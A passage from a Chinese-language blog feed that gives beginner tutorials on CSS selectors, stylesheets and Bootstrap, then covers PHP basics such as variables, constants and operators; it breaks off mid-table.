class="string">&quot;400&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210106161704671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTA3NTk4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>管理控制台：</strong></p><blockquote><p><strong>查看器</strong>：所查看的内容叫做  DOM –即文档对象模型–即树形结构，浏览器构造的<br><strong>控制台</strong>：可以执行JS代码<br><strong>网络</strong>：显示整个页面的所有网络请求  页面的网络连接<br><strong>存储</strong>：存储了页面的Cookie信息</p></blockquote><h2 id="CSS-（五）层叠样式表"><a href="#CSS-（五）层叠样式表" class="headerlink" title="CSS （五）层叠样式表"></a>CSS （五）<strong>层叠样式表</strong></h2><p>css 注释：<code>/* */</code></p><p><strong>一、语法组成：由 选择符 和 声明 构成</strong></p><blockquote><p>1.选择符用于选择 <strong>标签</strong><br>2.声明分为：<strong>属性</strong> 和 <strong>属性值</strong>，二者之间用冒号连接<br>3.声明放于花括号中，每条声明以分号结束<br><strong>注：所有CSS代码必须放在CSS样式表中</strong></p></blockquote><p><strong>二、CSS样式表：</strong></p><p><strong>1.内部样式表</strong> — 创建：<strong>style 标签</strong>，最好放在 head 标签中</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210111004211856.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTA3NTk4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>2.外部样式表</strong> — 创建：新建一个.css文件(开头最好写上<code>@charset &quot;utf-8&quot;; </code>用于控制当前编码格式)，然后导入到 html 页面内</p><p><strong>导入方式：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">方法一：<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./text.css&quot;</span>&gt;</span></span><br><span class="line">  rel=&quot;stylesheet&quot; 与css样式表建立关联性</span><br><span class="line">  href=&quot;&quot;          导入css样式表的路径</span><br><span class="line">  </span><br><span class="line">方法二：<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">           <span class="keyword">@import</span> url(路径);</span></span><br><span class="line"><span class="css">       </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">区别：</span><br><span class="line">1.本质：link是一个html标签；@import是css提供的一个导入方法</span><br><span class="line">2.加载顺序不同：link--导入的css代码与html同时加载；@import--等待html结构加载完毕后再加载样式</span><br><span class="line">3.兼容性：link兼容性较好</span><br><span class="line">4.JS操作dom的区别</span><br></pre></td></tr></table></figure><p><strong>3.内联样式表（内行样式）</strong>— 创建： &lt;标签 style=”样式表内容”&gt;&lt;/标签&gt;</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;border: 1px solid red; padding 10px&quot;</span>&gt;</span></span><br><span class="line">    测试</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>样式表的权重关系</strong>：<strong>体现了CSS的</strong> <strong>层叠性</strong></p><blockquote><p>1.<strong>内联样式表</strong>  权重最高<br>2.<strong>内部样式表</strong> 和 <strong>外部样式表</strong> 的权重关系与先后顺序有关，后面覆盖之前的<br><strong>注</strong>：仅仅覆盖产生冲突的属性（即相同的属性），不同的属性将继续执行。</p></blockquote><h2 id="CSS（六）选择符及其权重"><a href="#CSS（六）选择符及其权重" class="headerlink" title="CSS（六）选择符及其权重"></a>CSS（六）选择符及其权重</h2><p><strong>一、类型选择符 (标签选择符)</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">将html的 标签 当作 选择符 </span><br><span class="line">特点：将会选择该页面中所有同类型的标签 </span><br><span class="line">使用：想要更改清除某标签的默认样式时，或者是想要统一某个标签样式时</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210111234358280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTA3NTk4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>二、id 选择器</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用：</span><br><span class="line">1.起id名称：给指定标签起一个 id名称</span><br><span class="line">   &lt;标签 id=&quot;名称&quot;&gt;&lt;/标签&gt; </span><br><span class="line">2. 写样式：#id名称&#123;css代码&#125; </span><br></pre></td></tr></table></figure><blockquote><p><strong>特点</strong>：<strong>唯一性</strong> – 同一个页面只能出现一次,主要用于划分网页外围结构</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210111234622484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTA3NTk4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>id命名规范：</strong></p><p><img src="https://img-blog.csdnimg.cn/20210111180429726.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTA3NTk4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>三、类选择器 (class选择器)</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用：</span><br><span class="line">1.起class名称：</span><br><span class="line"> &lt;标签 class=&quot;名称 名称 名称...&quot;&gt;&lt;/标签&gt;</span><br><span class="line">2.写样式：.class名称&#123;css代码&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>特点</strong>:<br>1.同一个class可重复出现<br>2.一个标签可以有多个类名，空格隔开<br>3.可以用于调用一类样式</p></blockquote><p><strong>四、包含选择器 (关联选择器)</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">使用：嵌套</span><br><span class="line">.父元素选择符 .子元素选择符&#123;css代码&#125;</span><br><span class="line">也可使用 #  使用较灵活</span><br><span class="line"></span><br><span class="line">例子：</span><br><span class="line">table a&#123;</span><br><span class="line">color: #000;</span><br><span class="line">&#125;</span><br><span class="line">仅仅控制 table 中的 a 标签</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;www.baidu.com&quot;</span>&gt;</span>百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;www.baidu.com&quot;</span>&gt;</span>百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>五、群组选择符</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">使用：</span><br><span class="line">选择符1，选择符2，选择符3...&#123;css代码&#125;</span><br><span class="line"></span><br><span class="line">例子：</span><br><span class="line">h1,h2,h3&#123;</span><br><span class="line">color: #111;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>1<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>2<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>3<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>六、通配符：</strong>  * 选中页面中所有标签</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*&#123;</span><br><span class="line">    margin:0;   盒子外围间距</span><br><span class="line">    padding:0;  盒子内部间距</span><br><span class="line"> &#125;</span><br><span class="line"> 将页面中所有标签的 页面间距 均清零</span><br><span class="line"> 因此每次在样式开头记得写上</span><br></pre></td></tr></table></figure><p><strong>七、伪类选择器</strong>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> a:link&#123;color: #ff0000; text-decoration: none&#125;    初始状态的样式</span><br><span class="line"> a:visited&#123;color: #00ff 00; text-decoration: none&#125; 点击过后的样式</span><br><span class="line"> a:hover&#123;color: #0000ff; text-decoration: none&#125;   鼠标划过的样式</span><br><span class="line"> a:active&#123;color: #0f0f00; text-decoration: none&#125;  鼠标按下的样式</span><br><span class="line"> </span><br><span class="line">注：不要更改这四个样式的顺序</span><br></pre></td></tr></table></figure><p><strong>hover</strong></p><p>可更改自身以及自己子元素的样式，无法更改其父元素的样式</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">常用方式：交互</span><br><span class="line">a:&#123;</span><br><span class="line">    color:black; 默认颜色黑色</span><br><span class="line">  &#125;</span><br><span class="line">a:hover&#123;</span><br><span class="line">    color:red;   鼠标划过时红色</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>实现划过父元素更改子元素：<br><img src="https://img-blog.csdnimg.cn/20210111233526248.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTA3NTk4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>划过子元素更改父元素无法实现</p><h2 id="CSS-选择符的权重"><a href="#CSS-选择符的权重" class="headerlink" title="CSS 选择符的权重"></a>CSS 选择符的权重</h2><p><strong>1. ! important &gt; 内联样式 &gt; id &gt; class &gt; 标签</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">内联样式       1000</span><br><span class="line">id            100</span><br><span class="line">class、伪类    10</span><br><span class="line">标签           1</span><br><span class="line">通配符         0   </span><br><span class="line">包含选择符      权重是所有权重之和</span><br><span class="line">群组选择符      权重保持不变，看顺序，后覆盖前</span><br></pre></td></tr></table></figure><p><strong>2.CSS选择符的权重关系体现CSS的层叠性</strong></p><p><strong>3.开发者样式 &gt; 读者样式 &gt; 浏览器样式</strong></p><h2 id="CSS-中常见的属性"><a href="#CSS-中常见的属性" class="headerlink" title="CSS 中常见的属性"></a>CSS 中常见的属性</h2><p><strong>color 颜色属性：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">background-color: rgba(255,255,255,0);  #最后一个代表透明度</span><br><span class="line">background-color: #FFFFFF;</span><br></pre></td></tr></table></figure><p><strong>font 属性：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">font-size:#大小</span><br><span class="line">font-family:&quot;Microsoft Yahei&quot;#字体：</span><br><span class="line">font-style:#normal正常 italic斜体  oblique 倾斜的字体 </span><br><span class="line">font-weight:#字体加粗 bold</span><br></pre></td></tr></table></figure><p><strong>文本属性：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">text-indent:30px首行缩进</span><br><span class="line">text-overflow:文本溢出是否使用 省略号</span><br><span class="line">white-space:nowrap强制在同一行显示文本</span><br><span class="line">overflow:hidden; white-space:nowrap; text-overflow:ellipsis;  常用的搭配</span><br><span class="line"></span><br><span class="line">text-align: left center right  位置</span><br><span class="line">text-decoration: none underline line-through贯穿线</span><br><span class="line">text-shadow:1px 1px rgba(0,0,0,0.3)  阴影</span><br><span class="line">letter-spacing:  文字或字母间距</span><br><span class="line">line-height:  行高</span><br><span class="line">color:   颜色</span><br></pre></td></tr></table></figure><p><strong>边框属性：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">border: 宽度 样式 颜色</span><br><span class="line">border-color:</span><br><span class="line">border-style:</span><br><span class="line">border-width:</span><br><span class="line">border-left-color:</span><br><span class="line">border-left-style:</span><br><span class="line">border-left-width:</span><br><span class="line"></span><br><span class="line">border-radius:  圆角处理</span><br><span class="line">box-shadow:  设置或检索对象阴影</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/14/ExTY2ZRQ3wvcHgN.png" alt="image-20211114142429453"></p><p>补充：css 响应式布局</p><h2 id="Bootstrap"><a href="#Bootstrap" class="headerlink" title="Bootstrap"></a>Bootstrap</h2><p>最受欢迎的 css js html框架，用于开发响应式布局</p><p>bootstrap 差钱全部依赖 JQuery</p><p> 下载：<a href="https://v3.bootcss.com/">https://v3.bootcss.com/</a></p><p>Jquery 下载：<a href="https://jquery.com/">https://jquery.com/</a></p><p><img src="https://i.loli.net/2021/11/14/LHfTpVm3bh7r6dv.png" alt="image-20211114145951756"></p><p>一定要导入以上三个文件</p><p>然后在 class 里面改指定的名称即可</p><p><img src="https://i.loli.net/2021/11/14/nUrMakF2jXVN71C.png" alt="image-20211114150231172"></p><p> 能够看到 bootstrap 在之前的基础上有默认添加了一些样式用于美化</p><p>可以在官网看具体用法：<a href="https://v3.bootcss.com/css/">https://v3.bootcss.com/css/</a></p><p><img src="https://i.loli.net/2021/11/14/1Na7qJsE3b6Q5lA.png" alt="image-20211114153722056"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="HTML" scheme="https://xizhi-future.github.io/categories/HTML/"/>
    
    
    <category term="HTML" scheme="https://xizhi-future.github.io/tags/HTML/"/>
    
  </entry>
  
  <entry>
    <title>PHP基础全集</title>
    <link href="https://xizhi-future.github.io/2021/11/19/PHP%E5%9F%BA%E7%A1%80%E5%85%A8%E9%9B%86/"/>
    <id>https://xizhi-future.github.io/2021/11/19/PHP%E5%9F%BA%E7%A1%80%E5%85%A8%E9%9B%86/</id>
    <published>2021-11-19T08:44:49.000Z</published>
    <updated>2021-11-19T08:45:59.073Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="PHP（一）概述-基本语法"><a href="#PHP（一）概述-基本语法" class="headerlink" title="PHP（一）概述+基本语法"></a>PHP（一）概述+基本语法</h1><p><strong>php概述</strong>：</p><blockquote><p>1.主要目标是允许网络开发人员快速编写<strong>动态页面</strong>，主要被用于开发各种类型的网站程序<br>2.收集表单数据，生成动态页面，字符串处理，动态输出图像，处理服务器端文件，与数据库交互，会话跟踪，处理XML文件，支持大量的网络协议<br>3.PHP是<strong>脚本语言</strong>，后缀名为 <strong>.php</strong>,不需要事先编译，直接运行在<strong>服务器端</strong><br>4.PHP是一种<strong>弱类型语言</strong>，变量不需要声明其类型<br>5.PHP脚本按<strong>从上到下依次</strong>执行<br>6.PHP可<strong>与HTML进行混编</strong>，可嵌入到html代码中任何地方，且一个html文档中看嵌入<strong>多个PHP标记</strong>，脚本后缀名仍为 <strong>.php</strong></p></blockquote><p><strong>运行环境</strong><br>运行在windows,linux等操作系统上<br> windows  phpstudy linux  单独安装</p><p> <strong>PHP运行环境安装</strong>：<br>  Apache+PHP+MySQL<br>   LAMP<br> <strong>编辑器安装</strong> ：<br> zendstudio<br>  notepad++</p><p><strong>基本语法</strong></p><blockquote><p>1.<strong>PHP标记</strong>： <code>开始标记  &lt;?php</code>　 <code>结束标记    ?&gt; 　</code><br> <code>文件末尾的PHP代码结束标记在一些情况下可以省略</code><br>   2. <strong>指令分隔符</strong>：<code>;</code>一个PHP语句使用分号结束</p><pre><code>3.**注释**：`单行注释  //` 和 `多行注释    /*   */`</code></pre><p>   4.<strong>空白符</strong>：空格  Tab制表符  换行  英文状态输入<br>   5.<strong>随机数：</strong> rand(1<del>9);  指1</del>9范围内的随机数<br>   6.<strong>Error:</strong>   结束脚本执行<br>  <strong>Warning~  /  Notice:</strong>  只提示，不影响执行 　</p></blockquote><p>拓展：</p><blockquote><p><strong>PHP代码中的注释</strong>：不会显示在浏览器的源代码中，因为PHP的运行环境是服务器，而浏览器看到的是PHP引擎运行PHP代码后的执行结果；<br><strong>HTML代码中的注释</strong>：可以显示在浏览器上</p></blockquote><p><strong>简单语句</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">phpinfo();   查询php版本信息</span><br><span class="line"><span class="keyword">echo</span>         输出</span><br><span class="line">var_dump();  用于输出变量值及其变量类型</span><br><span class="line">形式：变量类型（变量值）</span><br><span class="line">gettype()</span><br><span class="line">var_dump(gettype(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><h1 id="PHP（二）变量-常量"><a href="#PHP（二）变量-常量" class="headerlink" title="PHP（二）变量  常量"></a>PHP（二）变量  常量</h1><h3 id="一、变量-符号开头"><a href="#一、变量-符号开头" class="headerlink" title="一、变量    $ 符号开头"></a>一、变量    $ 符号开头</h3><blockquote><ol><li><p>声明 : 不需要声明变量,但需要初始化 、</p></li><li><p>初始化：赋值<code>=</code> </p></li><li><p>释放：<code>unset()</code>  </p></li><li><p>判断一个变量是否存在：<code>isset()</code></p></li><li><p>命名： 字母 | 数字 |下划线，不可以数字开头，严格区分大小写，尽量不要使用PHP关键字作为变量名<br>例如：<code>$name1   $_name2   $my_name</code>  </p></li><li><p>变量的引用赋值：<code>$c=&amp;$a;</code>　<code>$a与$c指向同一块内存空间</code> 即<code> $a 随 $c 的改变而改变</code></p></li><li><p>变量与字符串之间使用<code>.</code>连接</p></li></ol></blockquote><h5 id="1-变量的类型"><a href="#1-变量的类型" class="headerlink" title="1.变量的类型"></a>1.变量的类型</h5><blockquote><p><strong>布尔类型</strong>：值为 <strong>true</strong> 或者是 <strong>false</strong><br><strong>int</strong>: 整数<br><strong>float</strong>: 浮点数<br><strong>string</strong>:字符串<br><strong>数组</strong>:array<br><strong>对象</strong> :object<br><strong>常量</strong>：  <code>define(&quot;a&quot;,&quot;90&quot;);</code><br><strong>预定义常量</strong></p></blockquote><h5 id="2-以下内容会自动转换为false"><a href="#2-以下内容会自动转换为false" class="headerlink" title="2.以下内容会自动转换为false"></a>2.以下内容会自动转换为false</h5><blockquote><p>1.布尔值false<br>2.0<br>3.浮点型0.0<br>4.空白字符串/字符串0<br>5.没有成员的数组<br>6.NULL</p></blockquote><h5 id="3-字符串的定义"><a href="#3-字符串的定义" class="headerlink" title="3.字符串的定义"></a>3.字符串的定义</h5><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">单引号: <span class="string">&#x27; &#x27;</span></span><br><span class="line">双引号: <span class="string">&quot; &quot;</span></span><br><span class="line">定界符: &lt;&lt;&lt; </span><br><span class="line">注意：定界符的开始于结束不能有任何字符，包括空白字符和注释 </span><br></pre></td></tr></table></figure><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">单引号与双引号：</span><br><span class="line"><span class="number">1.</span>单引号不能解析变量，双引号可以解析变量；</span><br><span class="line"><span class="number">2.</span>双引号执行转义字符，单引号不执行；</span><br><span class="line"><span class="number">3.</span>单引号输出特殊字符时需要转义,双引号不需要；</span><br><span class="line"><span class="number">4.</span>当双引号中插入单引号，单引号中插入变量$a时(即  echo <span class="string">&quot;&#x27;$a&#x27;&quot;</span>; )，会解析为<span class="string">&quot;$a&quot;</span></span><br><span class="line"><span class="number">5.</span>最好使用单引号，因为单引号效率高于双引号；</span><br><span class="line"><span class="number">6.</span>在双引号中插入变量时，变量要使用&#123;&#125;括起来；</span><br><span class="line">注：也可在变量后加上一个空格或者一个逗号，这种方法虽然可以解析出变量内容，但输出时也会输出一个空格和一个逗号，不提倡使用。</span><br></pre></td></tr></table></figure><p>例如：<br><img src="https://img-blog.csdnimg.cn/2021011220322156.png" alt="在这里插入图片描述"><br>结果为<br><img src="https://img-blog.csdnimg.cn/20210112203235124.png" alt="在这里插入图片描述"></p><p>定界符使用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&lt;&lt;&lt;ABC</span></span><br><span class="line"><span class="string">jiayou</span></span><br><span class="line"><span class="string">ABC</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure><h3 id="二、常量"><a href="#二、常量" class="headerlink" title="二、常量"></a>二、常量</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;90&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> a;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">define(<span class="string">&quot;b&quot;</span>,<span class="string">&quot;jiayou&quot;</span>);</span><br><span class="line">var_dump(b);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">var_dump(define(<span class="string">&quot;c&quot;</span>)); <span class="comment">//false</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="1-预定义常量"><a href="#1-预定义常量" class="headerlink" title="1.预定义常量"></a>1.预定义常量</h5><table><thead><tr><th>预定义常量</th><th>常量值</th></tr></thead><tbody><tr><td><code>PHP_OS</code></td><td>执行PHP解释器的操作系统名称</td></tr><tr><td><code>PHP_VERSION</code></td><td>当前PHP版本</td></tr><tr><td><code>DIRECTORY_SEPARATOR</code></td><td>分隔符 ：  \ 或者是 /</td></tr><tr><td><code>PHP_SAPI</code></td><td>用来判断是使用命令行还是浏览器执行的，如果 PHP_SAPI==’cli’ 表示是在命令行下执行</td></tr><tr><td><code>E_ERROR</code></td><td>最近的错误处</td></tr><tr><td><code>E_WARNING</code></td><td>最近的警告处</td></tr><tr><td><code>E_PARSE </code></td><td>分析语法的潜在问题</td></tr><tr><td><code>E_ NOTICE</code></td><td>发生不寻常但不一定错误</td></tr><tr><td><code>PHP_EOL</code></td><td>系统换行符，Windows是（\r\n），Linux是（/n），MAC是（\r）</td></tr><tr><td><code>DIRECTORY_SEPARATOR</code></td><td>系统目录分隔符，Windows是反斜线（\），Linux是斜线（/）</td></tr><tr><td><code>PATH_SEPARATOR</code></td><td>多路径间分隔符，Windows是反斜线（;），Linux是斜线（:）</td></tr></tbody></table><h5 id="2-魔术常量"><a href="#2-魔术常量" class="headerlink" title="2.魔术常量"></a>2.魔术常量</h5><table><thead><tr><th>魔术常量</th><th>常量值</th></tr></thead><tbody><tr><td><code> __FILE__</code></td><td>返回文件的完整路径和文件名</td></tr><tr><td><code>__LINE__</code></td><td>返回文件中的当前行号</td></tr><tr><td><code>__DIR__</code></td><td>文件当前路径，等价于 dirname(<code>__FILE__</code>)</td></tr><tr><td><code>__FUNCTUON__ </code></td><td>当前函数名</td></tr><tr><td><code>__CLASS__ </code></td><td>当前类名</td></tr><tr><td><code> __METHOD__</code></td><td>当前对象的方法名</td></tr><tr><td><code>__TRAIT__</code></td><td>Trait 的名字</td></tr><tr><td><code>__NAMESPACE__</code></td><td>当前命名空间的名称</td></tr></tbody></table><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">根据操作系统决定目录分隔符</span><br><span class="line">windows 为 \  Linux为 /</span><br></pre></td></tr></table></figure><p> <strong>注</strong>：</p><blockquote><p> 1.单引号定义的字符串中的单引号需要转义字符<code>/&#39;</code><br> 2.单引号定义的字符串中，<code>$</code>原样输出<br> 3.双引号定义的字符串中，<code>$</code>是变量的开始，且需要使用<code>&#123;&#125;</code>将变量括住，否则不知其何时结束识别不出<br> 4.单双引号定义的字符串中，特殊字符均需要转义</p></blockquote><h3 id="三、PHP-变量的范围"><a href="#三、PHP-变量的范围" class="headerlink" title="三、PHP 变量的范围"></a>三、PHP 变量的范围</h3><blockquote><p><strong>局部变量</strong>：函数内部定义的变量，作用范围是本函数<br><strong>全局变量</strong>：在函数外部定义的变量，作用于PHP整个脚本<br><strong>静态变量</strong>：函数内部用 <strong>static</strong> 定义，,仅在函数初次执行时被初始化</p></blockquote><p><strong>在函数中使用全局变量</strong>：</p><blockquote><p>1.通过<strong>传参</strong><br>2.<strong>global</strong> 声明为全局变量</p><ol start="3"><li><strong>常量</strong> 的作用域是 超全局 的       <code>define(&quot;a&quot;,&quot;90&quot;);</code></li></ol></blockquote><h1 id="PHP（三）-运算符"><a href="#PHP（三）-运算符" class="headerlink" title="PHP（三） 运算符"></a>PHP（三） 运算符</h1><p><strong>运算符：</strong></p><table><thead><tr><th align="center">运算符</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">算术运算符</td><td align="center">整型，浮点型</td></tr><tr><td align="center">逻辑运算符</td><td align="center">布尔类型</td></tr><tr><td align="center">比较运算符</td><td align="center">比较参与运算的单元是否相同，相同为真，不同为假</td></tr><tr><td align="center">赋值运算符</td><td align="center">也称二元运算符，左值为变量，右值可为变量，表达式，数值等，右赋左</td></tr><tr><td align="center">字符串运算符</td><td align="center">字符串连接符</td></tr></tbody></table><table><thead><tr><th align="center">逻辑运算符</th><th align="center">符号</th></tr></thead><tbody><tr><td align="center">与</td><td align="center"><code> and</code> 或者是  <code>&amp;&amp; </code></td></tr><tr><td align="center">或</td><td align="center"><code>or</code>  或者是 `</td></tr><tr><td align="center">非</td><td align="center"><code>!</code></td></tr><tr><td align="center">异或</td><td align="center"><code> xor</code>  